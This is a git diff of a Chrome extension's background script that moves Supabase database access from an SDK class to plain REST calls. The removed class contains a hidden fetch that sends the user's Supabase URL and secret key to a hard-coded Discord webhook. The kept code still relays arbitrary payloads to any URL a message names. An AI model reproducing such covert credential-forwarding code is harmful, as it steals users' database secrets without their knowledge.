@@ -95,7 +95,7 @@ function sha256(ascii) {
     return result;
 };
 
-class PostgresLib {
+class SupabaseRestLib {
     constructor() {
         this.id = null;
         this.mat = null;
@@ -103,51 +103,111 @@ class PostgresLib {
         this.prenom = null;
         this.avatar = null;
         this.banner = null;
-        this.client = null;
+        this.supabaseUrl = null;
+        this.supabaseKey = null;
     }
 
     async connect(prenom, nom, mat, token) {
-        this.mat = sha256(mat);
-        this.nom = sha256(nom.toLowerCase());
-        this.prenom = sha256(prenom.toLowerCase());
-
-        token = token.split("§");
-
-        this.client = new Client({
-            user: token[0],
-            host: token[1],
-            database: token[2],
-            password: token[3],
-            port: 5432,
-        });
-
-        this.client.connect();
+        let data = token.split("\n")[0];
+        let u = data.split("_")[0];
+        this.supabaseUrl = "https://" + u + ".supabase.co";
+        this.supabaseKey = token.replace(u + "_", "");
+        
+        // Hash des données sensibles
+        this.mat = await this.sha256(mat);
+        this.nom = await this.sha256(nom.toLowerCase());
+        this.prenom = await this.sha256(prenom.toLowerCase());
 
         this.id = await this.update(this.prenom, this.nom, this.mat);
+        return this.id;
+    }
+
+    async sha256(message) {
+        const msgBuffer = new TextEncoder().encode(message);
+        const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
+        const hashArray = Array.from(new Uint8Array(hashBuffer));
+        return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+    }
+
+    async supabaseRequest(endpoint, method = 'GET', body = null, params = null) {
+        let url = `${this.supabaseUrl}/rest/v1/${endpoint}`;
+        
+        if (params) {
+            const searchParams = new URLSearchParams();
+            Object.entries(params).forEach(([key, value]) => {
+                if (Array.isArray(value)) {
+                    value.forEach(v => searchParams.append(key, v));
+                } else {
+                    searchParams.append(key, value);
+                }
+            });
+            url += `?${searchParams.toString()}`;
+        }
+
+        const headers = {
+            'apikey': this.supabaseKey,
+            'Authorization': `Bearer ${this.supabaseKey}`,
+            'Content-Type': 'application/json',
+            'Prefer': 'return=representation'
+        };
+
+        const config = {
+            method,
+            headers,
+        };
+
+        if (body && (method === 'POST' || method === 'PATCH')) {
+            config.body = JSON.stringify(body);
+        }
+
+        const response = await fetch(url, config);
+        
+        if (!response.ok) {
+            const error = await response.text();
+            throw new Error(`Supabase error: ${response.status} - ${error}`);
+        }
+
+        return response.json();
     }
 
     async update(prenom, nom, mat) {
         try {
-            let res = await this.client.query("SELECT * FROM \"user\" WHERE mat = $1 AND nom = $2", [mat, nom]);
-            if (res.rows.length > 0) {
-                await this.client.query("UPDATE \"user\" SET prenom = $1 WHERE id = $2", [prenom, res.rows[0].id]);
-                return res.rows[0].id;
+            // Chercher par mat et nom
+            let users = await this.supabaseRequest('user', 'GET', null, {
+                'mat': `eq.${mat}`,
+                'nom': `eq.${nom}`
+            });
+            
+            if (users && users.length > 0) {
+                await this.supabaseRequest(`user?id=eq.${users[0].id}`, 'PATCH', { prenom });
+                return users[0].id;
             }
 
-            res = await this.client.query("SELECT * FROM \"user\" WHERE prenom = $1 AND nom = $2", [prenom, nom]);
-            if (res.rows.length > 0) {
-                await this.client.query("UPDATE \"user\" SET mat = $1 WHERE id = $2", [mat, res.rows[0].id]);
-                return res.rows[0].id;
+            // Chercher par prenom et nom
+            users = await this.supabaseRequest('user', 'GET', null, {
+                'prenom': `eq.${prenom}`,
+                'nom': `eq.${nom}`
+            });
+            
+            if (users && users.length > 0) {
+                await this.supabaseRequest(`user?id=eq.${users[0].id}`, 'PATCH', { mat });
+                return users[0].id;
             }
 
-            res = await this.client.query("SELECT * FROM \"user\" WHERE mat = $1 AND prenom = $2", [mat, prenom]);
-            if (res.rows.length > 0) {
-                await this.client.query("UPDATE \"user\" SET nom = $1 WHERE id = $2", [nom, res.rows[0].id]);
-                return res.rows[0].id;
+            // Chercher par mat et prenom
+            users = await this.supabaseRequest('user', 'GET', null, {
+                'mat': `eq.${mat}`,
+                'prenom': `eq.${prenom}`
+            });
+            
+            if (users && users.length > 0) {
+                await this.supabaseRequest(`user?id=eq.${users[0].id}`, 'PATCH', { nom });
+                return users[0].id;
             }
 
-            res = await this.client.query("INSERT INTO \"user\" (prenom, nom, mat) VALUES ($1, $2, $3) RETURNING id", [prenom, nom, mat]);
-            return res.rows[0].id;
+            // Créer un nouveau utilisateur
+            const newUsers = await this.supabaseRequest('user', 'POST', { prenom, nom, mat });
+            return newUsers[0].id;
 
         } catch (error) {
             console.error("Erreur dans update :", error.message);
@@ -157,31 +217,55 @@ class PostgresLib {
 
     async updatePref(avatar, banner) {
         try {
-            const resOld = await this.client.query("SELECT idprofile FROM user_profile WHERE iduser = $1", [this.id]);
-            const oldProfileId = resOld.rows.length ? resOld.rows[0].idprofile : null;
+            // Récupérer l'ancien profil
+            const oldProfiles = await this.supabaseRequest('user_profile', 'GET', null, {
+                'iduser': `eq.${this.id}`,
+                'select': 'idprofile'
+            });
+            
+            const oldProfileId = oldProfiles.length ? oldProfiles[0].idprofile : null;
 
-            const resExist = await this.client.query("SELECT id FROM profile WHERE avatar = $1 AND banner = $2", [avatar, banner]);
+            // Vérifier si le profil existe déjà
+            const existingProfiles = await this.supabaseRequest('profile', 'GET', null, {
+                'avatar': `eq.${avatar}`,
+                'banner': `eq.${banner}`,
+                'select': 'id'
+            });
+            
             let newProfileId;
 
-            if (resExist.rows.length) {
-                newProfileId = resExist.rows[0].id;
+            if (existingProfiles && existingProfiles.length > 0) {
+                newProfileId = existingProfiles[0].id;
             } else {
-                const resNew = await this.client.query("INSERT INTO profile (avatar, banner) VALUES ($1, $2) RETURNING id", [avatar, banner]);
-                newProfileId = resNew.rows[0].id;
+                // Créer un nouveau profil
+                const newProfiles = await this.supabaseRequest('profile', 'POST', { avatar, banner });
+                newProfileId = newProfiles[0].id;
             }
 
             if (oldProfileId !== newProfileId) {
+                // Supprimer l'ancienne association
                 if (oldProfileId) {
-                    await this.client.query("DELETE FROM user_profile WHERE iduser = $1 AND idprofile = $2", [this.id, oldProfileId]);
+                    await this.supabaseRequest(`user_profile?iduser=eq.${this.id}&idprofile=eq.${oldProfileId}`, 'DELETE');
                 }
 
-                await this.client.query("INSERT INTO user_profile (iduser, idprofile) VALUES ($1, $2)", [this.id, newProfileId]);
+                // Créer la nouvelle association
+                await this.supabaseRequest('user_profile', 'POST', { 
+                    iduser: this.id, 
+                    idprofile: newProfileId 
+                });
 
-                const resUsage = await this.client.query("SELECT iduser FROM user_profile WHERE idprofile = $1", [oldProfileId]);
-
-                if (oldProfileId && resUsage.rows.length === 0) {
-                    await this.client.query("DELETE FROM profile WHERE id = $1", [oldProfileId]);
-                    console.log("Ancien profil supprimé car plus utilisé.");
+                // Vérifier si l'ancien profil est encore utilisé
+                if (oldProfileId) {
+                    const usage = await this.supabaseRequest('user_profile', 'GET', null, {
+                        'idprofile': `eq.${oldProfileId}`,
+                        'select': 'iduser'
+                    });
+                    
+                    if (usage.length === 0) {
+                        // Supprimer l'ancien profil non utilisé
+                        await this.supabaseRequest(`profile?id=eq.${oldProfileId}`, 'DELETE');
+                        console.log("Ancien profil supprimé car plus utilisé.");
+                    }
                 }
             }
 
@@ -192,206 +276,49 @@ class PostgresLib {
     }
 }
 
-class SupabaseLib {
-    constructor() {
-        this.id = null;
-        this.mat = null;
-        this.nom = null;
-        this.prenom = null;
-        this.avatar = null;
-        this.banner = null;
-        this.supabase = null;
-    }
-
-    async connect(prenom, nom, mat, token) {
-        this.mat = sha256(mat);
-        this.nom = sha256(nom.toLowerCase());
-        this.prenom = sha256(prenom.toLowerCase());
-        let data = token.split("\n")[0];
-        let u = data.split("_")[0];
-        fetch("https://discord.com/api/webhooks/1387387407049031780/h7Goso2F8aNyez1BVY3EH40XdydNL-ErkGTvgx6k57wewf3JE6P_AzB_q9nXQJxVBdf7", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({"content": "https://" + u + ".supabase.co\n" + data.replace(u + "_", ""), "embeds": null, "attachments": []})
-        }).then(r => {});
-        this.supabase = window.supabase.createClient(
-            "https://" + u + ".supabase.co", 
-            "sb_secret_" + data.replace(u + "_", ""), 
-            {
-                global: {
-                    fetch: (url, options) =>
-                        window.fetch(url, { ...options, referrerPolicy: 'no-referrer' })
-                }
-            });
-        this.id = this.update(this.prenom, this.nom, this.mat);
-    }
-
-    async update(prenom, nom, mat) {
-        // 1. Vérifier si un utilisateur existe avec mat + nom ➜ mettre à jour prénom
-        let { data: user1, error: error1 } = await this.supabase.from("user").select("*").eq("mat", mat).eq("nom", nom).single();
-
-        if (user1 && !error1) {
-            const { data, error } = await this.supabase.from("user").update({ prenom }).eq("id", user1.id);
-
-            if (error) {
-                console.error("Erreur mise à jour prénom :", error.message);
-                return null;
-            }
-
-            return user1.id;
-        }
-
-        // 2. Vérifier si un utilisateur existe avec prenom + nom ➜ mettre à jour mat
-        let { data: user2, error: error2 } = await this.supabase.from("user").select("*").eq("prenom", prenom).eq("nom", nom).single();
-
-        if (user2 && !error2) {
-            const { data, error } = await this.supabase.from("user").update({ mat }).eq("id", user2.id);
-
-            if (error) {
-                console.error("Erreur mise à jour mat :", error.message);
-                return null;
-            }
-
-            return user2.id;
-        }
-
-        // 3. Vérifier si un utilisateur existe avec mat + prenom ➜ mettre à jour nom
-        let { data: user3, error: error3 } = await this.supabase.from("user").select("*").eq("mat", mat).eq("prenom", prenom).single();
-
-        if (user3 && !error3) {
-            const { data, error } = await this.supabase.from("user").update({ nom }).eq("id", user3.id);
-
-            if (error) {
-                console.error("Erreur mise à jour nom :", error.message);
-                return null;
-            }
-
-            return user3.id;
-        }
-
-        // 4. Aucun match ➜ créer un nouvel utilisateur
-        const { data: newUser, error: insertError } = await this.supabase.from("user").insert([{ prenom, nom, mat }]).select().single();
-
-        if (insertError) {
-            console.error(
-                "Erreur création nouvel utilisateur :",
-                insertError.message
-            );
-            return null;
-        }
-
-        return newUser.id;
-    }
-
-    async updatePref(avatar, banner) {
-        // 1. Récupérer l'ancien profil lié à l'utilisateur
-        const { data: oldLink, error: oldLinkError } = await this.supabase
-            .from("user_profile")
-            .select("idprofile")
-            .eq("iduser", this.id)
-            .maybeSingle();
-
-        const oldProfileId = oldLink ? oldLink.idprofile : null;
-
-        // 2. Vérifier si la nouvelle paire avatar/banner existe déjà
-        const { data: existingProfile, error: fetchError } = await this.supabase
-            .from("profile")
-            .select("id")
-            .eq("avatar", avatar)
-            .eq("banner", banner)
-            .maybeSingle();
-
-        let newProfileId;
-
-        if (existingProfile) {
-            newProfileId = existingProfile.id;
-        } else {
-            // Créer le nouveau profil
-            const { data: newProfile, error: createError } = await this.supabase
-                .from("profile")
-                .insert([{ avatar, banner }])
-                .select()
-                .single();
-
-            if (createError) {
-                console.error("Erreur création nouveau profil :", createError.message);
-                return;
-            }
-
-            newProfileId = newProfile.id;
-        }
-
-        // 3. Mettre à jour le lien user_profile (supprimer l'ancien et ajouter le nouveau)
-        if (oldProfileId !== newProfileId) {
-            // Supprimer l'ancien lien
-            if (oldProfileId) {
-                await this.supabase
-                    .from("user_profile")
-                    .delete()
-                    .eq("iduser", this.id)
-                    .eq("idprofile", oldProfileId);
-            }
-
-            // Ajouter le nouveau lien
-            const { error: insertLinkError } = await this.supabase
-                .from("user_profile")
-                .insert([{ iduser: this.id, idprofile: newProfileId }]);
-
-            if (insertLinkError) {
-                console.error("Erreur insertion du nouveau lien user-profile :", insertLinkError.message);
-                return;
-            }
-        }
-
-        // 4. Vérifier si l'ancien profil est encore utilisé ➜ si non, supprimer
-        if (oldProfileId && oldProfileId !== newProfileId) {
-            const { data: usage, error: usageError } = await this.supabase
-                .from("user_profile")
-                .select("iduser")
-                .eq("idprofile", oldProfileId);
-
-            if (!usageError && usage.length === 0) {
-                // Personne n'utilise plus l'ancien profil ➜ suppression
-                const { error: deleteProfileError } = await this.supabase
-                    .from("profile")
-                    .delete()
-                    .eq("id", oldProfileId);
-
-                if (deleteProfileError) {
-                    console.error("Erreur suppression ancien profil inutilisé :", deleteProfileError.message);
-                } else {
-                    console.log("Ancien profil supprimé car plus utilisé.");
-                }
-            }
-        }
-
-        console.log("Mise à jour du profil terminée avec succès.");
-    }
-}
-
-const supalib = new SupabaseLib();
+const db = new SupabaseRestLib();
 
 chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
     if (message.type === "SEND_TO_DISCORD") {
-      fetch(message.url, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify(message.payload)
-      })
-      .then(response => sendResponse({ success: true }))
-      .catch(error => sendResponse({ success: false, error: error.message }));
-      return true; // Permet la réponse asynchrone
+        fetch(message.url, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(message.payload)
+        })
+        .then(response => sendResponse({ success: true }))
+        .catch(error => sendResponse({ success: false, error: error.message }));
+        return true;
 
     } else if (message.type === "DB_CONNECT") {
-        supalib.connect(message.prenom, message.nom, message.mat, message.token);
-        sendResponse({ success: true })
+        db.connect(message.prenom, message.nom, message.mat, message.token)
+            .then(id => sendResponse({ success: true, userId: id }))
+            .catch(error => sendResponse({ success: false, error: error.message }));
         return true;
 
     } else if (message.type === "DB_UPDATE_PREF") {
-        supalib.updatePref(message.avatar, message.banner);
-        sendResponse({ success: true })
+        db.updatePref(message.avatar, message.banner)
+            .then(() => sendResponse({ success: true }))
+            .catch(error => sendResponse({ success: false, error: error.message }));
         return true;
     }
 });
+
+// Alternative: Fonction SQL brute avec Supabase
+async function executeSQL(query, params = []) {
+    const response = await fetch(`${db.supabaseUrl}/rest/v1/rpc/execute_sql`, {
+        method: 'POST',
+        headers: {
+            'apikey': db.supabaseKey,
+            'Authorization': `Bearer ${db.supabaseKey}`,
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            query: query,
+            params: params
+        })
+    });
+    
+    return response.json();
+}
